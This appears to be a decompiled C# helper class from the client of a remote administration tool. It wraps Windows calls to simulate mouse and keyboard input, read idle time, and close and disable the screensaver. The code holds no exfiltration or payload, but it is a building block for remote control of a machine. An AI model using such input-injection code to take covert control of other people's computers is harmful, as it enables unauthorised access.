using System;
using System.Drawing;
using System.Runtime.InteropServices;
using xClient.Core.Utilities;

namespace xClient.Core.Helper;

public static class NativeMethodsHelper
{
	private const uint MOUSEEVENTF_LEFTDOWN = 2u;

	private const uint MOUSEEVENTF_LEFTUP = 4u;

	private const uint MOUSEEVENTF_RIGHTDOWN = 8u;

	private const uint MOUSEEVENTF_RIGHTUP = 16u;

	private const uint MOUSEEVENTF_WHEEL = 2048u;

	private const uint KEYEVENTF_KEYDOWN = 0u;

	private const uint KEYEVENTF_KEYUP = 2u;

	private const int SPI_GETSCREENSAVERRUNNING = 114;

	private const uint DESKTOP_WRITEOBJECTS = 128u;

	private const uint DESKTOP_READOBJECTS = 1u;

	private const int WM_CLOSE = 16;

	private const uint SPI_SETSCREENSAVEACTIVE = 17u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	public static uint GetLastInputInfoTickCount()
	{
		NativeMethods.LASTINPUTINFO plii = default(NativeMethods.LASTINPUTINFO);
		plii.cbSize = (uint)Marshal.SizeOf((object)plii);
		plii.dwTime = 0u;
		if (!NativeMethods.GetLastInputInfo(ref plii))
		{
			return 0u;
		}
		return plii.dwTime;
	}

	public static void DoMouseLeftClick(Point p, bool isMouseDown)
	{
		NativeMethods.mouse_event(isMouseDown ? 2u : 4u, p.X, p.Y, 0, 0);
	}

	public static void DoMouseRightClick(Point p, bool isMouseDown)
	{
		NativeMethods.mouse_event(isMouseDown ? 8u : 16u, p.X, p.Y, 0, 0);
	}

	public static void DoMouseMove(Point p)
	{
		NativeMethods.SetCursorPos(p.X, p.Y);
	}

	public static void DoMouseScroll(Point p, bool scrollDown)
	{
		NativeMethods.mouse_event(2048u, p.X, p.Y, scrollDown ? (-120) : 120, 0);
	}

	public static void DoKeyPress(byte key, bool keyDown)
	{
		NativeMethods.keybd_event(key, 0, (!keyDown) ? 2u : 0u, 0);
	}

	public static bool IsScreensaverActive()
	{
		IntPtr lpvParam = IntPtr.Zero;
		NativeMethods.SystemParametersInfo(114u, 0u, ref lpvParam, 0u);
		return lpvParam != IntPtr.Zero;
	}

	public static void DisableScreensaver()
	{
		IntPtr intPtr = NativeMethods.OpenDesktop("Screen-saver", 0, inherit: false, 129u);
		if (intPtr != IntPtr.Zero)
		{
			NativeMethods.EnumDesktopWindows(intPtr, delegate(IntPtr hWnd, IntPtr lParam)
			{
				if (NativeMethods.IsWindowVisible(hWnd))
				{
					NativeMethods.PostMessage(hWnd, 16, 0, 0);
				}
				return true;
			}, IntPtr.Zero);
			NativeMethods.CloseDesktop(intPtr);
		}
		else
		{
			NativeMethods.PostMessage(NativeMethods.GetForegroundWindow(), 16, 0, 0);
		}
		IntPtr lpvParam = IntPtr.Zero;
		NativeMethods.SystemParametersInfo(17u, 1u, ref lpvParam, 2u);
	}
}
